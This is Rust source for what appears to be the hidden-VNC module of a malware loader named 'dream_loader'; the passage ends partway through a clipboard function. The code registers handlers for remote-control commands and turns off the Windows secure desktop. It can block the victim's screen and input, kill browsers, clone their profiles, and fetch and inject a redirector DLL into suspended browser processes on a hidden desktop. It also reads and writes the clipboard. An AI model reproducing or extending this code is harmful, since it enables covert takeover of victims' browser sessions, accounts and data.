#![allow(non_snake_case)]
#![allow(non_camel_case_types)]
#![allow(non_upper_case_globals)]
#![allow(unsafe_op_in_unsafe_fn)]
#![allow(dead_code)]
#![allow(unused_variables)]
#![allow(static_mut_refs)]
use win_utils::{get_special_folder, kill_module_processes, write_string_to_memory_as_utf16};
use windows_sys::{Wdk::{Foundation::{NtClose, OBJECT_ATTRIBUTES}, Storage::FileSystem::{ FILE_BASIC_INFORMATION,FILE_DIRECTORY_FILE, FILE_DIRECTORY_INFORMATION, FILE_NON_DIRECTORY_FILE, FILE_OPEN, FILE_OPEN_IF, FILE_OVERWRITE_IF, FILE_STANDARD_INFORMATION, FILE_SYNCHRONOUS_IO_NONALERT, FileDirectoryInformation, FileStandardInformation, NtCreateFile, NtQueryDirectoryFile, NtQueryInformationFile, NtReadFile, NtWriteFile, RtlInitUnicodeStringEx}}, Win32::{
    Foundation::{CloseHandle,GENERIC_ALL, GENERIC_READ, GENERIC_WRITE, GetLastError, HANDLE,MAX_PATH, NTSTATUS, STATUS_NO_MORE_FILES, STATUS_PENDING, STATUS_SUCCESS, UNICODE_STRING}, Storage::FileSystem::{CREATE_ALWAYS, CreateDirectoryW, CreateFileW, DeleteFileW, FILE_ATTRIBUTE_NORMAL, FILE_LIST_DIRECTORY, FILE_SHARE_READ, FILE_SHARE_WRITE, RemoveDirectoryW, SYNCHRONIZE, WriteFile}, System::{DataExchange::{CloseClipboard, EmptyClipboard, GetClipboardData, OpenClipboard, SetClipboardData}, IO::IO_STATUS_BLOCK, LibraryLoader::{GetModuleHandleW, GetProcAddress}, Memory::{GMEM_MOVEABLE, GlobalAlloc, GlobalLock, GlobalUnlock, MEM_COMMIT, MEM_RESERVE, PAGE_READWRITE, VirtualAlloc}, StationsAndDesktops::{CreateDesktopW, SetThreadDesktop}, Threading::{CREATE_SUSPENDED, CREATE_UNICODE_ENVIRONMENT, CreateProcessW, DETACHED_PROCESS, OpenProcess, PROCESS_INFORMATION, PROCESS_TERMINATE, ResumeThread, STARTUPINFOW, TerminateProcess}}, UI::{HiDpi::{PROCESS_PER_MONITOR_DPI_AWARE, SetProcessDpiAwareness}, Shell::{CSIDL_ADMINTOOLS, FO_COPY, FO_DELETE, FOF_NO_UI, SHCreateDirectoryExW, SHFILEOPSTRUCTW, SHFileOperationW, SHGetSpecialFolderPathW}, WindowsAndMessaging::GetDesktopWindow}
}, s, w};
use std::{ffi::c_void, fs, iter, mem::{self, size_of}, ops::Index, vec::Vec};

//pub mod test;
pub mod input;
pub mod windows;
pub mod desktop;
mod screenshot;
mod types;
mod browsers;
pub mod monitors;

use inject::{self, create_remote_thread_with_event};

use std::{ptr, slice, sync::{OnceLock, RwLock}};

use crate::{browsers::{brave_profile_from_process, chrome_profile_from_process, default_browser, firefox_profile_from_process, msedge_profile_from_process}, desktop::{current_desktop, disable_secure_desktop, start_explorer, task_bar_glom_level, update_cached_desktop_state}, input::block_input_wrapper, monitors::disable_monitors, types::{KEYBOARD_INPUT_PACKET, MONITOR_INFO, MOUSE_MOVE_PACKET, PROTOCOL_KEY_DIRECTION}, windows::first_browser_window};

#[derive(Debug, Clone, PartialEq)]
pub struct HijackerPaths {
    pub src: String,
    pub dst: String,
}

#[derive(Debug, Clone, PartialEq)]
pub struct RedirectorPaths {
    pub to_redirect: String,
    pub redirect_to: String,
    pub redirect_to_replace: String,
    pub redirect_replace_with: String,
}

pub fn last_path_element(path:&str) -> String {
    let normalized = path.trim_end_matches('\\').replace('/', "\\");
    
    let components: Vec<&str> = normalized.split('\\').collect();
    return components[components.len()-1].to_string()
}

pub fn pop_last_path_element(path:&str) -> String {
    let normalized = path.trim_end_matches('\\').replace('/', "\\");
    
    let components: Vec<&str> = normalized.split('\\').collect();
    
    let src_components = &components[..components.len() - 1];
    src_components.join("\\")
}

pub fn generate_hijacker_paths(profile_path: &str) -> Option<HijackerPaths> {
    let normalized = profile_path.trim_end_matches('\\').replace('/', "\\");
    
    let components: Vec<&str> = normalized.split('\\').collect();
    
    if components.len() < 4 {
        return None;
    }

    let src_components = &components[..components.len() - 1];
    let src = src_components.join("\\");

    let replace_idx = src_components.len() - 2;
    let original_component = src_components[replace_idx];
    
    let replacement = generate_same_length_replacement(original_component);
    
    let mut dst_components: Vec<&str> = src_components.to_vec();
    let replacement_owned = replacement.clone();
    dst_components[replace_idx] = &replacement_owned;
    
    let dst = src_components.iter().enumerate().map(|(i, &c)| {
        if i == replace_idx {
            replacement.as_str()
        } else {
            c
        }
    }).collect::<Vec<&str>>().join("\\");
    
    Some(HijackerPaths { src, dst })
}

pub fn generate_redirector_paths(profile_path: &str) -> Option<RedirectorPaths> {
    let normalized = profile_path.trim_end_matches('\\').replace('/', "\\");
    let components: Vec<&str> = normalized.split('\\').collect();
    
    if components.len() < 4 {
        return None;
    }
    
    let src_components = &components[..components.len() - 1];
    let replace_idx = src_components.len() - 2;
    let original_component = src_components[replace_idx];
    let replacement = generate_same_length_replacement(original_component);
    
    let to_redirect = src_components[..src_components.len() - 1].join("\\");
    
    let redirect_to = src_components[..src_components.len() - 1].iter().enumerate().map(|(i, &c)| {
        if i == replace_idx {
            replacement.as_str()
        } else {
            c
        }
    }).collect::<Vec<&str>>().join("\\");
    
    let redirect_to_replace = format!("\\{}\\" , original_component);
    let redirect_replace_with = format!("\\{}\\", replacement);
    
    Some(RedirectorPaths {
        to_redirect,
        redirect_to,
        redirect_to_replace,
        redirect_replace_with,
    })
}

pub fn generate_same_length_replacement(original: &str) -> String {
    let len = original.len();
    if len == 0 {
        return String::new();
    }
    
    let base = "dldr";
    
    if len <= base.len() {
        base[..len].to_string()
    } else {
        base.chars().cycle().take(len).collect()
    }
}

#[repr(u16)]
pub enum MESSAGE_CODE {
    KEEP_ALIVE = 0,
	COLLECT_META = 1,

	MODULE_LIST     = 2,
	MODULE_LOAD     = 2<<8 | 1,
	MODULE_UNLOAD   = 2<<8 | 2,
	MODULE_UPLOAD = 2<<8 | 3,
    MODULE_COMMAND  = 2<<8 | 4,
	
    FILE_COPY     = 3,
	FILE_MOVE     = 3<<8 | 1,
	FILE_DELETE   = 3<<8 | 2,
	FILE_UPLOAD   = 3<<8 | 3,
	FILE_DOWNLOAD = 3<<8 | 4,
	
    DIRECTORY_PRINT  = 4,
	DIRECTORY_CHANGE = 4<<8 | 1,
	DIRECTORY_CREATE = 4<<8 | 2,
	DIRECTORY_COPY   = 4<<8 | 3,
	DIRECTORY_MOVE   = 4<<8 | 4,
	DIRECTORY_LIST   = 4<<8 | 5,
	DIRECTORY_DELETE = 4<<8 | 6,

    DRIVE_LIST = 5<<8 | 5,

    VNC                   = 6,
    VNC_RGBA_DATA         = 6<<8 | 1,
    VNC_JPEG_DATA         = 6<<8 | 2,
    VNC_MOUSE_BUTTON      = 6<<8 | 3,
    VNC_MOUSE_MOVE        = 6<<8 | 4,
    VNC_SEND_KEY          = 6<<8 | 5,
    VNC_GET_WINDOWS       = 6<<8 | 6,
    VNC_SET_WINDOW        = 6<<8 | 7,
    VNC_GET_DESKTOP       = 6<<8 | 8,
    VNC_SET_DESKTOP       = 6<<8 | 9,
    VNC_GET_CLIPBOARD     = 6<<8 | 10,
    VNC_SET_CLIPBOARD     = 6<<8 | 11,
    VNC_GET_BROWSERS      = 6<<8 | 12,
    VNC_LAUNCH_BROWSER    = 6<<8 | 14,
    VNC_RESIZE_WINDOW     = 6<<8 | 15,
    VNC_REQUEST_FB_UPDATE = 6<<8 | 16,
    VNC_BLOCK_INPUT       = 6<<8 | 17,
    VNC_BLOCK_SCREEN      = 6<<8 | 18,
}


type download_rsrc = extern "system" fn (url: *const u16,buffer: *mut u8,buffer_size: usize,bytes_written: *mut usize) -> u32;
static download_rsrc: OnceLock<download_rsrc> = OnceLock::new();


#[derive(Clone, Copy, Default)]
pub struct CaptureOffset {
    pub x: i32,
    pub y: i32,
}

#[derive(Clone, Copy, Default)]
pub struct CaptureDimensions {
    pub w:i32,
    pub l:i32,
}

static CAPTURE_OFFSET: OnceLock<RwLock<CaptureOffset>> = OnceLock::new();

static CAPTURE_DIMENSIONS:OnceLock<RwLock<CaptureDimensions>> = OnceLock::new();

fn capture_offset_global() -> &'static RwLock<CaptureOffset> {
    CAPTURE_OFFSET.get_or_init(|| RwLock::new(CaptureOffset::default()))
}

fn capture_dimensions_global() -> &'static RwLock<CaptureDimensions> {
    CAPTURE_DIMENSIONS.get_or_init(|| RwLock::new(CaptureDimensions::default()))
}

pub fn set_capture_offset(x: i32, y: i32) {
    let lock = capture_offset_global();
    let mut offset = lock.write().unwrap();
    offset.x = x;
    offset.y = y;
}

fn get_capture_offset() -> CaptureOffset {
    let lock = capture_offset_global();
    let offset = lock.read().unwrap();
    *offset
}

pub fn set_capture_dimensions(w:i32,l:i32) {
    let lock = capture_dimensions_global();
    let mut dimensions = lock.write().unwrap();
    dimensions.w = w;
    dimensions.l = l;
}

pub fn get_capture_dimensions() -> CaptureDimensions {
    let lock = capture_dimensions_global();
    let dimensions = lock.read().unwrap();
    *dimensions
}

struct proc {
    flags: u8,
    message_code:u16,
    address: usize,
    name_len:u32,
    name:[u16;16],
}

#[unsafe(no_mangle)]
pub unsafe fn register(internal_proc_list_ptr:*const usize, internal_proc_list_len:*const usize,module_proc_list_ptr:*mut usize,module_proc_list_len:*mut usize) -> i32 {

    SetProcessDpiAwareness(PROCESS_PER_MONITOR_DPI_AWARE);
    disable_secure_desktop();
    
    let mut offset:usize = 0;
    loop {
        let ptr = internal_proc_list_ptr as *const c_void;
        let current_internal_proc = ptr.add(offset).cast::<proc>();

        if (*current_internal_proc).address != 0 {
            let name = String::from_utf16(slice::from_raw_parts(&(*current_internal_proc).name as *const _,(*current_internal_proc).name_len as usize)).unwrap();
            #[cfg(debug_assertions)]
            {
                println!("found internal proc: {}",name);
            }
            if name.trim().eq_ignore_ascii_case("download_rsrc") {
                download_rsrc.set(std::mem::transmute((*current_internal_proc).address)).expect("already initialized");
            }
        } else {
            break
        }
        offset = offset + size_of::<proc>();
    } 

    let mut proc_list:Vec<proc> = Vec::new();

    proc_list.push(proc { flags: 0, message_code: MESSAGE_CODE::VNC_GET_WINDOWS as u16, address:monitors as usize, name_len: 0, name: [0;16] });
    proc_list.push(proc { flags: 0, message_code: MESSAGE_CODE::VNC_JPEG_DATA as u16, address:framebuffer as usize, name_len: 0, name: [0;16] });
    proc_list.push(proc { flags: 0, message_code: MESSAGE_CODE::VNC_MOUSE_MOVE as u16, address:mouse_move as usize, name_len:0, name:[0;16]});
    proc_list.push(proc { flags: 0, message_code: MESSAGE_CODE::VNC_MOUSE_BUTTON as u16, address:mouse_button as usize, name_len:0, name:[0;16]});
    proc_list.push(proc { flags: 0, message_code: MESSAGE_CODE::VNC_SEND_KEY as u16, address:keyboard_input as usize, name_len:0, name:[0;16]});
    proc_list.push(proc { flags: 0, message_code: MESSAGE_CODE::VNC_SET_DESKTOP as u16, address:set_desktop as usize, name_len:0, name:[0;16]});
    proc_list.push(proc { flags: 0, message_code: MESSAGE_CODE::VNC_GET_BROWSERS as u16, address:browsers as usize, name_len:0, name:[0;16]});
    proc_list.push(proc { flags: 0, message_code: MESSAGE_CODE::VNC_LAUNCH_BROWSER as u16, address:launch_browser as usize, name_len:0, name:[0;16]});
    proc_list.push(proc { flags: 0, message_code: MESSAGE_CODE::VNC_SET_CLIPBOARD as u16, address:set_clipboard as usize, name_len:0, name:[0;16]});
    proc_list.push(proc { flags: 0, message_code: MESSAGE_CODE::VNC_GET_CLIPBOARD as u16, address:get_clipboard as usize, name_len:0, name:[0;16]});
    proc_list.push(proc { flags: 0, message_code: MESSAGE_CODE::VNC_BLOCK_INPUT as u16, address:block_input as usize, name_len:0, name:[0;16]});
    proc_list.push(proc { flags: 0, message_code: MESSAGE_CODE::VNC_BLOCK_SCREEN as u16, address:block_screen as usize, name_len:0, name:[0;16]});
    proc_list.push(proc { flags: 0, message_code: 0, address: 0, name_len: 0, name: [0;16] });

    let out_proc_list_len = size_of::<proc>()*proc_list.len();
    *module_proc_list_len = out_proc_list_len;

    let out_proc_list = VirtualAlloc(std::ptr::null(), out_proc_list_len, MEM_COMMIT|MEM_RESERVE,PAGE_READWRITE);
    ptr::copy_nonoverlapping(proc_list.as_ptr() as *const _, out_proc_list, out_proc_list_len);
    ptr::write(module_proc_list_ptr, out_proc_list as usize);
    0
}

pub unsafe fn block_screen(flags: *mut u16,label:u32,input: *const usize,input_size:usize,out: *mut usize,out_size: *mut usize) -> i32 {
    let d:Vec<u8> = slice::from_raw_parts(input as *const _, input_size).to_vec();
    let block:i32 = i32::from_le_bytes([d[0],d[1],d[2],d[3]]);
    disable_monitors(block);
    0
}

pub unsafe fn block_input(flags: *mut u16,label:u32,input: *const usize,input_size:usize,out: *mut usize,out_size: *mut usize) -> i32 {
    let d:Vec<u8> = slice::from_raw_parts(input as *const _, input_size).to_vec();
    let block:i32 = i32::from_le_bytes([d[0],d[1],d[2],d[3]]);
    block_input_wrapper(block);
    0
}

/*
copies the target profile to the required destination.
*/
pub fn setup_redirection_profile(full_profile_path:&str) {
    match generate_hijacker_paths(&full_profile_path) {
        Some(paths) => {

            unsafe {
            let dst_wide: Vec<u16> = paths.dst.encode_utf16().chain(iter::once(0)).chain(iter::once(0)).collect();

            let src_wide: Vec<u16> = paths.src.encode_utf16().chain(iter::once(0)).chain(iter::once(0)).collect();

            let mut any_ops_aborted:i32 = 0;
            let mut name_mappings:*mut c_void = std::ptr::null_mut();
            let mut fileopstruct:SHFILEOPSTRUCTW = SHFILEOPSTRUCTW {
                hwnd: std::ptr::null_mut(),
                wFunc: FO_DELETE,
                pFrom: dst_wide.as_ptr(),
                pTo: std::ptr::null(),
                fFlags: FOF_NO_UI as u16,
                fAnyOperationsAborted: any_ops_aborted,
                hNameMappings: name_mappings,
                lpszProgressTitle: std::ptr::null(),
            };

            let status = SHFileOperationW(&mut fileopstruct);
            //DE_INVALIDFILES	0x7C	The path in the source or destination or both was invalid.
            if status != 0 && status != 0x7C {
                panic!("failed to remove directory: {}, status:{:x}",paths.dst,status);
            }

            //this would cause a nested user data for example "User Data/User Data"
            /*
            let status = CreateDirectoryW(dst_wide.as_ptr(),std::ptr::null());
            if status == 0 {
                panic!("{:x}",status);
            }
            */

            let mut any_ops_aborted:i32 = 0;
            let mut name_mappings:*mut c_void = std::ptr::null_mut();
            let mut fileopstruct:SHFILEOPSTRUCTW = SHFILEOPSTRUCTW {
                hwnd: std::ptr::null_mut(),
                wFunc: FO_COPY,
                pFrom: src_wide.as_ptr(),
                pTo: dst_wide.as_ptr(),
                fFlags: FOF_NO_UI as u16,
                fAnyOperationsAborted: any_ops_aborted,
                hNameMappings: name_mappings,
                lpszProgressTitle: std::ptr::null(),
            };

            let status = SHFileOperationW(&mut fileopstruct);
            if status != 0 {
                panic!("failed to copy directory: {}, status:{:x}",paths.dst,GetLastError());
            }
            }
        },
        None => {
            panic!("failed to generate hijacker paths");
        }
    }


}

/*
writes the redirect.txt config file and redirector.dll file to the required destination.
*/
pub fn setup_redirection_dll(full_profile_path:&str,redirect_txt_path:&str,redirect_dll_path:&str) {
    //redirctor config file
    {
        let redirctor_paths =  generate_redirector_paths(&full_profile_path).unwrap();

        let towrite = format!("to_redirect={}\nredirect_to={}\nredirect_to_replace={}\nredirect_replace_with={}\n",
        redirctor_paths.to_redirect,
        redirctor_paths.redirect_to,
        redirctor_paths.redirect_to_replace,
        redirctor_paths.redirect_replace_with);

        let _ = fs::remove_file(redirect_txt_path);

        let _ = fs::write(redirect_txt_path, towrite);

    }

    //redirector dll
    {
        #[cfg(debug_assertions)] {

            let _ = fs::remove_file(&redirect_dll_path);

            let _ = fs::copy(r"C:\Users\user\source\repos\dream_loader\dream_loader_vnc_module\target\debug\redirector_injection.dll", redirect_dll_path);
        } 
        #[cfg(not(debug_assertions))] {
            let download_resource_proc:download_rsrc = match  download_rsrc.get() {
                Some(v) => *v,
                None => {
                    panic!("no redirctor module");
                }
            };

            let mut required_size: usize = 0;
            let result = download_resource_proc(
                w!(r"redirector_injection.dll"),
                std::ptr::null_mut(),
                0,
                &mut required_size,
            );

            let mut buffer: Vec<u8> = vec![0; required_size];
                let mut bytes_written: usize = 0;
                
                let result = download_resource_proc(
                    w!(r"redirector_injection.dll"),
                    buffer.as_mut_ptr(),
                    buffer.len(),
                    &mut bytes_written,
            );

            let _ = fs::remove_file(&redirect_dll_path);
            
            let _ = fs::write(&redirect_dll_path, buffer);
        } 
    }
}


/*
start the relevent browser with the worm redirection injection
*/
pub fn start_browser_process(module_path:&str,redirect_dll_path:&str,using_profile_redirection:bool) {
    unsafe {
    let (mut desktop_name,is_input_desktop) = match desktop::current_desktop() {
        Ok(v) => {v},
        Err(e) => {
            panic!("{:x}",e);
        }
    };

    if is_input_desktop {
        let default_hdesktop = String::from("hdesktop1");
        desktop_name = default_hdesktop.clone();
        set_desktop_helper(default_hdesktop.encode_utf16().chain(std::iter::once(0)).collect());
    }

    let command_line:String;
    if module_path.ends_with("msedge.exe") {
        command_line = format!("msedge.exe");

    } else if module_path.ends_with("chrome.exe") {
        command_line = format!("chrome.exe");

    } else if module_path.ends_with("brave.exe") {
        command_line = format!("brave.exe");

    } else if module_path.ends_with("firefox.exe") {
        command_line = format!("firefox.exe");

    } else {
        panic!("unsuported browser");
    }

    let applicationname:Vec<u16> = module_path.encode_utf16().chain(iter::once(0)).collect();

    let mut command_line_utf16:Vec<u16> = command_line.encode_utf16().collect();
    command_line_utf16.push(0);

    let mut current_dir:Vec<u16> = String::from(r#"C:\Windows\System32\"#).encode_utf16().collect();
    current_dir.push(0);

    let mut startup_info: STARTUPINFOW = Default::default();
    startup_info.cb = size_of::<STARTUPINFOW>() as u32;
    
    let mut desktop_name:Vec<u16> = desktop_name.encode_utf16().chain(iter::once(0)).collect();
    startup_info.lpDesktop = desktop_name.as_mut_ptr();

    let mut process_info: PROCESS_INFORMATION = Default::default();

    if using_profile_redirection {
        let status = CreateProcessW(
            applicationname.as_ptr(),
            command_line_utf16.as_mut_ptr(),
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            0,
            CREATE_UNICODE_ENVIRONMENT|DETACHED_PROCESS|CREATE_SUSPENDED,
            std::ptr::null_mut(),
            current_dir.as_ptr(),
            &mut startup_info,
            &mut process_info,
        );

        if status == 0 {
            panic!("{:x}",GetLastError());
        }

        let status = create_remote_thread_with_event(redirect_dll_path.to_string(), process_info.dwProcessId);
        if status as i32 != STATUS_SUCCESS {
            panic!("{:x}",GetLastError());
        }

        ResumeThread(process_info.hThread);
    } else {
        let status = CreateProcessW(
            applicationname.as_ptr(),
            command_line_utf16.as_mut_ptr(),
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            0,
            CREATE_UNICODE_ENVIRONMENT|DETACHED_PROCESS,
            std::ptr::null_mut(),
            current_dir.as_ptr(),
            &mut startup_info,
            &mut process_info,
        );

        if status == 0 {
            panic!("{:x}",GetLastError());
        }
    }
    #[cfg(debug_assertions)]
    {
        println!("Browser launched with PID: {}",process_info.dwProcessId);
    }
}
}

pub unsafe fn launch_browser_helper(module_path:String,profile_path:String,profile_name:String,launch_options:u32) {


    kill_module_processes(&module_path);

    if launch_options == 1 {

        let output_dir = get_special_folder(CSIDL_ADMINTOOLS);
        let redirect_dll_path:String = format!("{}\\{}",output_dir,"redi.dll");
        let redirect_txt_path:String = format!("{}\\{}",output_dir,"redirect.txt");
        #[cfg(debug_assertions)]
        {
            println!("{}",redirect_dll_path);
            println!("{}",redirect_txt_path);
        }

        let full_profile_path = if profile_path.ends_with(&profile_name) {
            profile_path.clone()   
        } else {
            format!("{}\\{}", profile_path, profile_name)
        };

        setup_redirection_profile(&full_profile_path);

        setup_redirection_dll(&full_profile_path, &redirect_txt_path,&redirect_dll_path);

        start_browser_process(&module_path, &redirect_dll_path,true);
    } else {
        start_browser_process(&module_path,"",false);
    }

}

#[unsafe(no_mangle)]
pub unsafe fn launch_browser(flags: *mut u16,label:u32,input: *const usize,input_size:usize,out: *mut usize,out_size: *mut usize) -> i32 {
    let data = slice::from_raw_parts(input as *const u8, input_size);
    let module_path_len = u32::from_le_bytes([data[0],data[1],data[2],data[3]]);
    let profile_path_len = u32::from_le_bytes([data[4],data[5],data[6],data[7]]);
    let profile_name_len = u32::from_le_bytes([data[8],data[9],data[10],data[11]]);
    let launch_options = u32::from_be_bytes([data[12],data[13],data[14],data[15]]);

    let module_path = match String::from_utf16(slice::from_raw_parts(input.byte_offset(16) as *const u16, module_path_len as usize /2)) {
        Ok(v) => {v},
        Err(e) => {
            let error_out = output_module_error(format!("failed to decode module path: {}",e.to_string()));
            write_string_to_memory_as_utf16(out,out_size,error_out);

            *flags = 1|16;
            return 0
        },
    };

    let profile_path = match String::from_utf16(slice::from_raw_parts(input.byte_offset(16+module_path_len as isize) as *const u16,profile_path_len as usize /2 )) {
        Ok(v) => {v},
        Err(e) => {
            let error_out = output_module_error(format!("failed to decode profile path: {}",e.to_string()));
            write_string_to_memory_as_utf16(out,out_size,error_out);
            *flags = 1|16;
            return 0
        },
    };

    let profile_name = match String::from_utf16(slice::from_raw_parts(input.byte_offset(16+(module_path_len+profile_path_len) as isize) as *const u16, profile_name_len as usize /2)) {
        Ok(v) => {v},
        Err(e) => {
            let error_out = output_module_error(format!("failed to decode profile name: {}",e.to_string()));
            write_string_to_memory_as_utf16(out,out_size,error_out);

            *flags = 1|16;
            return 0
        },
    };

    launch_browser_helper(module_path, profile_path, profile_name, launch_options);

    match desktop::current_desktop() {
        Ok((current_name,is_input)) => {
            let json_output = format!(r#"{{"desktop_name":"{}","is_input_desktop":{}}}"#, current_name.trim_end_matches('\0'), is_input);

            write_string_to_memory_as_utf16(out,out_size,json_output);
        },

        Err(e) => {
            let error_out = output_module_error(format!("failed to get desktop info: {}",e.to_string()));
            write_string_to_memory_as_utf16(out,out_size,error_out);

            *flags = 1|16;
            return 0
        } 
    }
    0
}

fn hex_encode(s: &str) -> String {
    s.encode_utf16()
        .flat_map(|u| u.to_le_bytes())
        .map(|b| format!("{:02x}", b))
        .collect()
}

pub unsafe fn browsers_helper() -> String {

    let default_browser_raw = default_browser();
    let default_browser_hex = hex_encode(&default_browser_raw);

    let mut images: Vec<String> = Vec::new();
    images.append(&mut browsers::browser_paths().unwrap_or_default());

    let browser_windows = windows::running_browser_windows(w!("Default"), images);
    
    let mut active_browsers_json = String::from("[");
    for window in &browser_windows {
        let (profile_path, profile_name): (String, String);
        if window.module_path.ends_with("msedge.exe") {
            (profile_path, profile_name) = msedge_profile_from_process(window.pid);
        } else if window.module_path.ends_with("firefox.exe") {
            (profile_path, profile_name) = firefox_profile_from_process(window.pid);
        } else if window.module_path.ends_with("chrome.exe") {
            (profile_path, profile_name) = chrome_profile_from_process(window.pid);
        } else if window.module_path.ends_with("brave.exe") {
            (profile_path, profile_name) = brave_profile_from_process(window.pid);
        } else {
            profile_path = String::new();
            profile_name = String::new();
        }
        
        active_browsers_json.push_str(&format!(
            r#"{{"pid":{},"minimized":{},"window_name":"{}","module_path":"{}","profile_path":"{}","profile_name":"{}"}},"#,
            window.pid,
            window.minimized,
            hex_encode(&window.window_name),
            hex_encode(&window.module_path),
            hex_encode(&profile_path),
            hex_encode(&profile_name)
        ));
    }
    active_browsers_json = active_browsers_json.trim_end_matches(',').to_string();
    active_browsers_json.push(']');

    let all_profiles = browsers::browser_profiles();
    
    let mut all_profiles_json = String::from("[");
    for profile in &all_profiles {
        all_profiles_json.push_str(&format!(
            r#"{{"browser_name":"{}","module_path":"{}","profile_name":"{}","profile_path":"{}","is_default":{}}},"#,
            hex_encode(&profile.browser_name),
            hex_encode(&profile.module_path),
            hex_encode(&profile.profile_name),
            hex_encode(&profile.profile_path),
            profile.is_default
        ));
    }
    all_profiles_json = all_profiles_json.trim_end_matches(',').to_string();
    all_profiles_json.push(']');

    let json_output = format!(
        r#"{{"default_browser":"{}","active_browsers":{},"all_profiles":{}}}"#,
        default_browser_hex,
        active_browsers_json,
        all_profiles_json
    );

    json_output
}

#[unsafe(no_mangle)]
pub unsafe fn browsers(flags: *mut u16,label:u32,input: *const usize,input_size:usize,out: *mut usize,out_size: *mut usize) -> i32 {
    write_string_to_memory_as_utf16(out, out_size, browsers_helper());
    0
}

pub unsafe fn set_desktop_helper(desktop_name:Vec<u16>) -> i32 {
    let hwnd = CreateDesktopW(desktop_name.as_ptr() as *const u16,std::ptr::null(),std::ptr::null(),0,GENERIC_ALL,std::ptr::null());
    if hwnd == std::ptr::null_mut() {
        return GetLastError() as i32;
    }

    let status = SetThreadDesktop(hwnd);
    if status == 0 {
        return GetLastError() as i32;
    }

    // Update cached desktop state after switching
    // Check if this is the input desktop by querying UOI_IO
    let (desktop_name_str, is_input) = current_desktop().unwrap_or_default();
    update_cached_desktop_state(desktop_name_str, !is_input);
    if !is_input {
        let windows = crate::windows::desktop_windows(hwnd);
        
        let mut explorer_started:bool = false;
        for window in &windows {
            if window.window_name == "Program Manager" {
                explorer_started = true;
                break
            }
        }
        if !explorer_started {
            task_bar_glom_level();
            let _ = start_explorer(desktop_name.as_ptr());
        }
    }
    0
}

#[unsafe(no_mangle)]
pub unsafe fn set_desktop(flags: *mut u16,label:u32,input: *const usize,input_size:usize,out: *mut usize,out_size: *mut usize) -> i32 {
    let mut desktop_name:Vec<u16> = slice::from_raw_parts(input as *const u16, input_size/2).to_vec();
    desktop_name.push(0);
    set_desktop_helper(desktop_name);

    match desktop::current_desktop() {
        Ok((current_name,is_input)) => {
            let json_output = format!(r#"{{"desktop_name":"{}","is_input_desktop":{}}}"#, current_name.trim_end_matches('\0'), is_input);

            write_string_to_memory_as_utf16(out, out_size, json_output);
        },
        Err(status) => {return status as i32} 
    }
    0
}


pub unsafe fn keyboard_input(flags: *mut u16,label:u32,input: *const usize,input_size:usize,out: *mut usize,out_size: *mut usize) -> i32 {
    if input_size >= size_of::<KEYBOARD_INPUT_PACKET>() {
        let msg = slice::from_raw_parts(input as *const u8, input_size);
        let virtual_key_code = msg[0];
        let scan_code = u32::from_le_bytes([msg[1],msg[2],msg[3],msg[4]]);
        let direction:PROTOCOL_KEY_DIRECTION = if msg[5] == 0 { PROTOCOL_KEY_DIRECTION::UP } else { PROTOCOL_KEY_DIRECTION::DOWN };
        
        let is_hidden = desktop::is_hidden_desktop_cached();
        
        return input::keyboard_button_wrapper(is_hidden,
        virtual_key_code,
        scan_code,
        direction);
    }
    0
}


#[unsafe(no_mangle)]
pub unsafe fn mouse_move(flags: *mut u16,label:u32,input: *const usize,input_size:usize,out: *mut usize,out_size: *mut usize) -> i32 {
    if input_size >= size_of::<MOUSE_MOVE_PACKET>() {
        let mouse_move_packet = *input.cast::<MOUSE_MOVE_PACKET>();
        
        let is_hidden = desktop::is_hidden_desktop_cached();

        input::mouse_move_wrapper(is_hidden, mouse_move_packet.x_offset, mouse_move_packet.y_offset);
    }
    0
}


#[unsafe(no_mangle)]
pub unsafe fn mouse_button(flags: *mut u16,label:u32,input: *const usize,input_size:usize,out: *mut usize,out_size: *mut usize) -> i32 {
    if input_size >= size_of::<types::MOUSE_BUTTON_PACKET>() {
        //need to do this because of alignment issues with struct.
        let msg = slice::from_raw_parts(input as *const u8, input_size);
        let virtual_key_code:u8 = msg[0];
        let scancode:u32 = u32::from_le_bytes([msg[1], msg[2], msg[3], msg[4]]);
        let direction:PROTOCOL_KEY_DIRECTION = if msg[5] == 0 { PROTOCOL_KEY_DIRECTION::UP } else { PROTOCOL_KEY_DIRECTION::DOWN };
        let x_offset:i32 = i32::from_le_bytes([msg[6], msg[7], msg[8], msg[9]]);
        let y_offset:i32 = i32::from_le_bytes([msg[10], msg[11], msg[12], msg[13]]);
        
        let is_hidden = desktop::is_hidden_desktop_cached();

        return input::mouse_button_wrapper(is_hidden, x_offset, y_offset, virtual_key_code, direction);
    }
    0
}


#[repr(u32)]
enum clipboard_format {
    CF_TEXT = 1,
    CF_BITMAP = 2,
    CF_SYLK = 4,
    CF_DIF = 5,
    CF_TIFF = 6,
    CF_OEMTEXT = 7,
    CF_DIB = 8,
    CF_PALETTE = 9,
    CF_PENDATA = 10,
    CF_RIFF = 11,
    CF_WAVE = 12,
    CF_UNICODETEXT = 13
}


#[unsafe(no_mangle)]
pub unsafe fn set_clipboard(flags: *mut u16,label:u32,input: *const usize,input_size:usize,out: *mut usize,out_size: *mut usize) -> i32 {
    let hwnd = GetDesktopWindow();
    let status = OpenClipboard(hwnd);
    if status == 0 {
        return -1; // Failed to open clipboard
    }

    if EmptyClipboard() == 0 {
        CloseClipboard();
        return -2; // Failed to empty clipboard
    }

    let alloc_size = input_size + 2;
    let hmem = GlobalAlloc(GMEM_MOVEABLE, alloc_size);
    if hmem.is_null() {
        CloseClipboard();
        return -3; // Failed to allocate memory
    }
    
    let mem_ptr = GlobalLock(hmem);
    if mem_ptr.is_null() {
        CloseClipboard();
        return -4; // Failed to lock memory
    }

    ptr::copy_nonoverlapping(input as *const u8, mem_ptr as *mut u8, input_size);
    ptr::write_bytes((mem_ptr as *mut u8).add(input_size), 0, 2);

    GlobalUnlock(hmem);

    let result = SetClipboardData(clipboard_format::CF_UNICODETEXT as u32, hmem);
    if result.is_null() {
        CloseClipboard();
        return -5; // Failed to set clipboard data
    }

    CloseClipboard();
    0
}


#[unsafe(no_mangle)]
pub unsafe fn get_clipboard(flags: *mut u16,label:u32,input: *const usize,input_size:usize,out: *mut usize,out_size: *mut usize) -> i32 {
    let hwnd = GetDesktopWindow();
    let status = OpenClipboard(hwnd);
    if status == 0 {
        return -1; // Failed to open clipboard
    }

    let clipboard_handle = GetClipboardData(clipboard_format::CF_UNICODETEXT as u32);
    if clipboard_handle.is_null() {
        CloseClipboard();
        *out_size = 0;
        *out = 0;
        return 0;
    }
    
